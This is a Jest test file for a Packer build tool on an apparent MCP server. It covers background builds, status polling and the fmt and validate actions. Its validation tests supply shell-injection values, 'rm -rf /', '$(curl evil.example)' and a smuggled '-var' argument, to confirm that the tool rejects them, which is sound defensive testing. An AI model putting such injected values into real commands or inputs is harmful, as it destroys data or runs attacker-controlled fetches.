jest.mock('../run-command.js', () => ({
  getRepoRoot: () => '/repo',
  runCommand: jest.fn(),
  runCommandCaptureExit: jest.fn(),
}));

import type { JobRunner, JobSnapshot } from '@legacy-sports/mcp-jobs';

// packer-build runs its builds on the shared job runner (LS-8564). Mock the
// runner so tests drive the tool contract through controlled snapshots
// instead of real child processes.
jest.mock('@legacy-sports/mcp-jobs', () => {
  const startJob = jest.fn();
  const snapshotJob = jest.fn();
  const waitForJob = jest.fn();
  return {
    MAX_WAIT_MS: 55_000,
    createJobRunner: () => ({
      startJob,
      snapshotJob,
      waitForJob,
      runJobWithBudget: jest.fn(),
      listJobs: jest.fn(),
    }),
    __mock: { startJob, snapshotJob, waitForJob },
  };
});

import {
  packerBuild,
  packerBuildStatus,
  packerBuildWait,
} from './packer-build.js';
import { runCommand, runCommandCaptureExit } from '../run-command.js';

const mockedRun = runCommand as jest.MockedFunction<typeof runCommand>;
const mockedCaptureExit = runCommandCaptureExit as jest.MockedFunction<
  typeof runCommandCaptureExit
>;

interface MockedJobsModule {
  __mock: {
    startJob: jest.MockedFunction<JobRunner['startJob']>;
    snapshotJob: jest.MockedFunction<JobRunner['snapshotJob']>;
    waitForJob: jest.MockedFunction<JobRunner['waitForJob']>;
  };
}

// Routing the cast through an `unknown` param (rather than an inline
// `x as T`) avoids a typescript-eslint 8.60+ no-unnecessary-type-assertion
// false positive that would otherwise get autofixed away by pc-lint.
function asMockedJobsModule(v: unknown): MockedJobsModule {
  return v as MockedJobsModule;
}

const { __mock: runnerMock } = asMockedJobsModule(
  jest.requireMock('@legacy-sports/mcp-jobs'),
);
const mockStartJob = runnerMock.startJob;
const mockSnapshotJob = runnerMock.snapshotJob;
const mockWaitForJob = runnerMock.waitForJob;

const BUILD_LOG =
  "==> amazon-ebs.runner: AMI: ami-0abc1234def56789a\nBuild 'amazon-ebs.runner' finished after 2 minutes 5 seconds.\n";

const IMAGE_META_JSON = JSON.stringify({
  Images: [
    {
      Name: 'runner-ami',
      BlockDeviceMappings: [{ Ebs: { SnapshotId: 'snap-0abc123' } }],
      Tags: [{ Key: 'role', Value: 'runner' }],
    },
  ],
});

const BUILD_ID = 'packer-1700000000000-abc1234';

function snapshot(overrides: Partial<JobSnapshot>): JobSnapshot {
  return {
    jobId: BUILD_ID,
    status: 'running',
    label: 'packer build x.pkr.hcl',
    cwd: '/repo',
    elapsedSec: 3,
    exitCode: null,
    error: null,
    ...overrides,
  };
}

function startedJob(): void {
  mockStartJob.mockReturnValue({
    jobId: BUILD_ID,
    logPath: `/tmp/packer-builds/${BUILD_ID}.log`,
    existing: false,
  });
}

function body(result: {
  content: Array<{ type: string; text?: string }>;
  isError?: boolean;
}): { parsed: Record<string, unknown>; isError: boolean } {
  const block = result.content[0];
  if (!block || block.type !== 'text' || !block.text)
    throw new Error('expected text block');
  return {
    parsed: JSON.parse(block.text) as Record<string, unknown>,
    isError: Boolean(result.isError),
  };
}

/** runCommand mock: aws describe-images resolves image metadata. */
function mockCommands(): void {
  mockedRun.mockImplementation((command) =>
    Promise.resolve(command === 'aws' ? IMAGE_META_JSON : ''),
  );
}

beforeEach(() => {
  mockedRun.mockReset();
  mockedCaptureExit.mockReset();
  mockStartJob.mockReset();
  mockSnapshotJob.mockReset();
  mockWaitForJob.mockReset();
});

describe('packerBuild input validation', () => {
  it('rejects an hclPath with shell metacharacters without invoking packer', async () => {
    const { parsed, isError } = body(
      await packerBuild({
        hclPath: 'x.pkr.hcl; rm -rf /',
        runInBackground: true,
      }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/Invalid hclPath/);
    expect(mockedRun).not.toHaveBeenCalled();
    expect(mockStartJob).not.toHaveBeenCalled();
  });

  it('rejects a var value with shell metacharacters without invoking packer', async () => {
    const { parsed, isError } = body(
      await packerBuild({
        hclPath: 'x.pkr.hcl',
        vars: { ami_name: '$(curl evil.example)' },
        runInBackground: true,
      }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/disallowed characters/);
    expect(mockedRun).not.toHaveBeenCalled();
    expect(mockStartJob).not.toHaveBeenCalled();
  });

  it('rejects a var value with spaces (argument smuggling through the shell join)', async () => {
    const { parsed, isError } = body(
      await packerBuild({
        hclPath: 'x.pkr.hcl',
        vars: { ami_name: 'x -var evil=1' },
        runInBackground: true,
      }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/disallowed characters/);
    expect(mockStartJob).not.toHaveBeenCalled();
  });

  it('rejects a var name that is not a plain identifier', async () => {
    const { parsed, isError } = body(
      await packerBuild({
        hclPath: 'x.pkr.hcl',
        vars: { 'bad name': 'value' },
        runInBackground: true,
      }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/Invalid var name/);
    expect(mockStartJob).not.toHaveBeenCalled();
  });

  it('accepts a Windows-style absolute hclPath', async () => {
    startedJob();

    const { parsed, isError } = body(
      await packerBuild({
        hclPath: 'D:\\repo\\terraform\\runners\\packer\\runner-ami.pkr.hcl',
        runInBackground: true,
      }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
  });
});

describe('packerBuild', () => {
  it('returns immediately with a buildId when runInBackground=true', async () => {
    startedJob();

    const { parsed, isError } = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', runInBackground: true }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
    expect(String(parsed.buildId)).toMatch(/^packer-/);
    expect(String(parsed.message)).toMatch(/packer_build_status/);
  });

  it('runs packer init and packer build as one shell-composite job', async () => {
    startedJob();

    await packerBuild({
      hclPath: 'x.pkr.hcl',
      vars: { ami_name: 'runner' },
      runInBackground: true,
    });

    expect(mockStartJob).toHaveBeenCalledTimes(1);
    const opts = mockStartJob.mock.calls[0][0];
    expect(opts.command).toBe('packer');
    expect(opts.shell).toBe(true);
    expect(opts.args[0]).toBe('init');
    expect(opts.args).toContain('&&');
    expect(opts.args).toContain('build');
    expect(opts.args).toContain('ami_name=runner');
  });

  it('returns a running snapshot with a re-arm hint when the build outlives the sync budget', async () => {
    startedJob();
    mockWaitForJob.mockResolvedValue(
      snapshot({ status: 'running', logTail: 'transforming...' }),
    );

    const { parsed, isError } = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', maxWaitSeconds: 0 }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
    expect(parsed.status).toBe('running');
    expect(String(parsed.hint)).toMatch(/packer_build_wait/);
  });

  it('returns the finished structured result when the build completes within the budget', async () => {
    mockCommands();
    startedJob();
    mockWaitForJob.mockResolvedValue(
      snapshot({ status: 'done', exitCode: 0, log: BUILD_LOG }),
    );

    const { parsed, isError } = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', maxWaitSeconds: 10 }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
    expect(parsed.status).toBe('done');
    expect(parsed.amiId).toBe('ami-0abc1234def56789a');
    expect(parsed.durationSec).toBe(125);
    expect(parsed.snapshotId).toBe('snap-0abc123');
  });

  it('surfaces a packer init failure inside the job as a failed build, not a hang', async () => {
    startedJob();
    // `packer init` runs inside the composite job: a plugin-download failure
    // exits the job non-zero and its output lands in the job log.
    mockWaitForJob.mockResolvedValue(
      snapshot({
        status: 'failed',
        exitCode: 1,
        error: 'packer build x.pkr.hcl exited with code 1',
        log: 'Error: plugin download failed\n',
      }),
    );

    const { parsed, isError } = body(
      await packerBuild({ hclPath: 'x.pkr.hcl', maxWaitSeconds: 10 }),
    );
    expect(isError).toBe(true);
    expect(parsed.ok).toBe(false);
    expect(String(parsed.error)).toMatch(/exited with code 1/);
    expect(String(parsed.logTail)).toMatch(/plugin download failed/);
  });
});

describe('packerBuildWait', () => {
  it('errors on an unknown buildId', async () => {
    mockWaitForJob.mockResolvedValue(null);

    const { parsed, isError } = body(
      await packerBuildWait({ buildId: 'packer-nope' }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/not found/);
  });

  it('returns a non-error running snapshot when the wait cap expires', async () => {
    mockWaitForJob.mockResolvedValue(
      snapshot({ status: 'running', logTail: 'still baking' }),
    );

    const { parsed, isError } = body(
      await packerBuildWait({ buildId: BUILD_ID, timeoutSec: 0 }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
    expect(parsed.status).toBe('running');
    expect(String(parsed.hint)).toMatch(/packer_build_wait/);
  });

  it('returns the finished result once the build completes', async () => {
    mockCommands();
    mockWaitForJob.mockResolvedValue(
      snapshot({ status: 'done', exitCode: 0, log: BUILD_LOG }),
    );

    const { parsed, isError } = body(
      await packerBuildWait({
        buildId: BUILD_ID,
        timeoutSec: 10,
        pollIntervalSec: 1,
      }),
    );
    expect(isError).toBe(false);
    expect(parsed.status).toBe('done');
    expect(parsed.amiId).toBe('ami-0abc1234def56789a');
  });
});

describe('packerBuildStatus', () => {
  it('reports running with elapsed time for an in-flight build', async () => {
    mockSnapshotJob.mockReturnValue(
      snapshot({ status: 'running', logTail: 'transforming...' }),
    );

    const { parsed, isError } = body(
      await packerBuildStatus({ buildId: BUILD_ID }),
    );
    expect(isError).toBe(false);
    expect(parsed.status).toBe('running');
    expect(typeof parsed.elapsedSec).toBe('number');
  });

  it('reports a disk-recovered build with no recorded result as orphaned', async () => {
    mockSnapshotJob.mockReturnValue(
      snapshot({
        status: 'orphaned',
        logTail: BUILD_LOG,
        hint: 'started by a previous MCP server process',
      }),
    );

    const { parsed, isError } = body(
      await packerBuildStatus({ buildId: BUILD_ID }),
    );
    expect(isError).toBe(true);
    expect(parsed.ok).toBe(false);
    expect(parsed.status).toBe('orphaned');
    expect(String(parsed.hint)).toMatch(/previous MCP server process/);
  });
});

describe('packerBuild action: "fmt"', () => {
  it('rejects an hclPath with shell metacharacters without invoking packer', async () => {
    const { parsed, isError } = body(
      await packerBuild({
        action: 'fmt',
        hclPath: 'x.pkr.hcl; rm -rf /',
      }),
    );
    expect(isError).toBe(true);
    expect(String(parsed.error)).toMatch(/Invalid hclPath/);
    expect(mockedCaptureExit).not.toHaveBeenCalled();
  });

  it('runs packer fmt -check -diff by default and reports ok:true on a clean file', async () => {
    mockedCaptureExit.mockResolvedValue({ stdout: '', stderr: '', code: 0 });

    const { parsed, isError } = body(
      await packerBuild({ action: 'fmt', hclPath: 'x.pkr.hcl' }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
    expect(parsed.diff).toBe('');
    expect(mockedCaptureExit).toHaveBeenCalledWith(
      'packer',
      ['fmt', '-check', '-diff', '/repo/x.pkr.hcl'],
      '/repo',
    );
  });

  it('passes through a non-zero exit as ok:false with the diff output', async () => {
    mockedCaptureExit.mockResolvedValue({
      stdout: '-x\n+y',
      stderr: '',
      code: 1,
    });

    const { parsed, isError } = body(
      await packerBuild({ action: 'fmt', hclPath: 'x.pkr.hcl' }),
    );
    expect(isError).toBe(true);
    expect(parsed.ok).toBe(false);
    expect(parsed.diff).toBe('-x\n+y');
  });

  it('honors check:false / diff:false by omitting those flags', async () => {
    mockedCaptureExit.mockResolvedValue({ stdout: '', stderr: '', code: 0 });

    await packerBuild({
      action: 'fmt',
      hclPath: 'x.pkr.hcl',
      check: false,
      diff: false,
    });
    expect(mockedCaptureExit).toHaveBeenCalledWith(
      'packer',
      ['fmt', '/repo/x.pkr.hcl'],
      '/repo',
    );
  });

  it('caps diff output at 5000 chars', async () => {
    mockedCaptureExit.mockResolvedValue({
      stdout: 'x'.repeat(6000),
      stderr: '',
      code: 1,
    });

    const { parsed } = body(
      await packerBuild({ action: 'fmt', hclPath: 'x.pkr.hcl' }),
    );
    expect(String(parsed.diff).length).toBeLessThanOrEqual(5000 + 20);
  });

  it('reports a missing packer binary as ok:false without throwing', async () => {
    mockedCaptureExit.mockRejectedValue(
      new Error('packer CLI not found (spawn packer ENOENT): ...'),
    );

    const { parsed, isError } = body(
      await packerBuild({ action: 'fmt', hclPath: 'x.pkr.hcl' }),
    );
    expect(isError).toBe(true);
    expect(parsed.ok).toBe(false);
    expect(String(parsed.error)).toMatch(/packer CLI not found/);
  });
});

describe('packerBuild action: "validate"', () => {
  it('runs packer validate -syntax-only by default and reports ok:true', async () => {
    mockedCaptureExit.mockResolvedValue({ stdout: '', stderr: '', code: 0 });

    const { parsed, isError } = body(
      await packerBuild({ action: 'validate', hclPath: 'x.pkr.hcl' }),
    );
    expect(isError).toBe(false);
    expect(parsed.ok).toBe(true);
    expect(parsed.errors).toEqual([]);
    expect(mockedCaptureExit).toHaveBeenCalledWith(
      'packer',
      ['validate', '-syntax-only', '/repo/x.pkr.hcl'],
      '/repo',
    );
  });

  it('returns structured errors[] on a syntax error', async () => {
    mockedCaptureExit.mockResolvedValue({
      stdout: '',
      stderr: 'Error: Invalid reference\n\n  on x.pkr.hcl line 3:\n   bad',
      code: 1,
    });

    const { parsed, isError } = body(
      await packerBuild({ action: 'validate', hclPath: 'x.pkr.hcl' }),
    );
    expect(isError).toBe(true);
    expect(parsed.ok).toBe(false);
    expect(parsed.errors).toEqual([
      'Error: Invalid reference\n\n  on x.pkr.hcl line 3:\n   bad'.split(
        /\n{2,}/,
      )[0],
      'on x.pkr.hcl line 3:\n   bad',
    ]);
  });

  it('honors syntaxOnly:false by omitting the flag', async () => {
    mockedCaptureExit.mockResolvedValue({ stdout: '', stderr: '', code: 0 });

    await packerBuild({
      action: 'validate',
      hclPath: 'x.pkr.hcl',
      syntaxOnly: false,
    });
    expect(mockedCaptureExit).toHaveBeenCalledWith(
      'packer',
      ['validate', '/repo/x.pkr.hcl'],
      '/repo',
    );
  });
});
